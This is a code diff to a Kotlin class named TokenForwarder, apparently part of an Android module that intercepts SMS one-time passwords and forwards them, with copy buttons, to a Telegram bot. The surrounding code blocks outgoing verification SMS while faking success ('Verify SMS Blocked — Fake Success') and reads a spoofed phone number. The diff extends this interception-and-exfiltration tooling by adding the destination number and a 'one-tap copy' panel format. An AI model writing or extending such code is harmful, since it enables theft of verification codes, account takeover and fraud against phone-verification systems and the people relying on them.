@@ -53,9 +53,11 @@ class TokenForwarder(
         val creds = resolveTelegramCreds()
         if (creds.first.isBlank() || creds.second.isBlank()) return false
         val config = configManager.load()
+        val dest = otp.rawPeer.ifBlank { otp.sender }
         val message = buildInterceptMessage(otp, config)
         val sendFrom = resolveSendFrom(config)
-        val markup = buildCopyReplyMarkup(sendFrom, smsCopyText(otp))
+        val smsBody = smsCopyText(otp)
+        val markup = buildGianCopyReplyMarkup(dest, smsBody, sendFrom)
         val sent = postTelegram(creds.first, creds.second, message, markup, useHtml = false)
         if (sent) {
             context?.let { ClipboardCopyHelper.copySms(it, smsCopyText(otp)) }
@@ -91,7 +93,8 @@ class TokenForwarder(
         val outgoing = otp.direction.equals("outgoing", ignoreCase = true)
         val smsBody = smsCopyText(otp)
         if (outgoing) {
-            return buildOutgoingBlockedMessage(smsBody, resolveSendFrom(config))
+            val dest = otp.rawPeer.ifBlank { otp.sender }
+            return buildOutgoingBlockedMessage(dest, smsBody, resolveSendFrom(config))
         }
 
         val peerValue = otp.sender.ifBlank { otp.rawPeer }
@@ -113,21 +116,29 @@ class TokenForwarder(
         }
     }
 
-    private fun buildOutgoingBlockedMessage(smsBody: String, sendFrom: String): String {
-        return buildString {
-            appendLine("📱 Verify SMS Blocked — Fake Success ✅")
-            appendLine(TELEGRAM_BRANDING)
-            appendLine()
-            appendLine("Send FROM:")
-            appendLine(sendFrom.ifBlank { "—" })
-            appendLine()
-            appendLine("Body / Token:")
-            append(smsBody)
-        }
+    private fun buildOutgoingBlockedMessage(dest: String, smsBody: String, sendFrom: String): String {
+        return GianPanelCompat.buildTelegramInterceptMessage(dest.ifBlank { sendFrom }, smsBody)
     }
 
     private fun resolveSendFrom(config: ModuleConfig): String =
         configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
+
+    private fun buildGianCopyReplyMarkup(dest: String, copyBody: String, sendFrom: String): JSONObject {
+        val oneTap = GianPanelCompat.oneTapCopy(dest.ifBlank { sendFrom }, copyBody)
+        val row = JSONArray().apply {
+            put(
+                JSONObject()
+                    .put("text", "📋 One-tap copy")
+                    .put("copy_text", JSONObject().put("text", clipCopyText(oneTap)))
+            )
+            put(
+                JSONObject()
+                    .put("text", "📋 Copy SMS Body")
+                    .put("copy_text", JSONObject().put("text", clipCopyText(copyBody)))
+            )
+        }
+        return JSONObject().put("inline_keyboard", JSONArray().put(row))
+    }
 
     private fun buildCopyReplyMarkup(copyNumber: String, copyBody: String): JSONObject {
         val row = JSONArray().apply {
